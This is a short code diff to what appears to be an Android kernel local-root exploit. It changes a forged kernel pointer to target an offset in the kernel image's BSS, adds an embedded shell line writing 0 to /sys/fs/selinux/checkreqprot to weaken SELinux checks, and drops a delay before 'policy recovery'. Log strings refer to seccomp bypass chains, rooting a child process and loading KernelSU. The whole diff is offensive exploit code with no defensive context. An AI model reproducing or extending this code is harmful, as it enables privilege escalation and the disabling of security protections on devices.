@@ -1,0 +1,32 @@
+--- a/src/core/util.c
++++ b/src/core/util.c
+@@ -345,7 +345,8 @@
+          * child. Use the stable writable zero page, as the 5.15 primitive
+          * requires, instead of a reclaimed payload page. */
+         fake_right = active_offsets && active_offsets->mcast_waiter_off
+-                         ? data_addr(EMPTY_ZERO_PAGE)
++                         ? data_addr(KIMAGE_TEXT_BASE +
++                                     active_offsets->off_mcast_fake_bss) + 0x1240
+                          : base + 0x100;
+       }
+     } else {
+--- a/src/core/main.c
++++ b/src/core/main.c
+@@ -596,6 +596,8 @@
+       "  echo '[!] temp su unavailable; aborting' >>\"$LOG\"\n"
+       "  exit 1\n"
+        "fi\n"
++       "# W1's 64-bit child pointer makes adjacent booleans non-zero.\n"
++       "echo 0 > /sys/fs/selinux/checkreqprot 2>/dev/null\n"
+        "if grep -q '^kernelsu[[:space:]]' /proc/modules 2>/dev/null; then\n"
+        "  echo '[+] KernelSU already loaded' >>\"$LOG\"\n"
+        "fi\n"
+@@ -1309,7 +1311,7 @@
+   if (!seccomp_ok)
+     pr_warning("W3 seccomp bypass failed after 3 chain rounds; ksud late-load will likely stay blocked\n");
+ 
+-  sleep(2);
++  /* Dispatch policy recovery immediately after W2. */
+   TIMER("exploit complete");
+   if (!ever_rooted) {
+     pr_error("w2 never rooted a child\n");
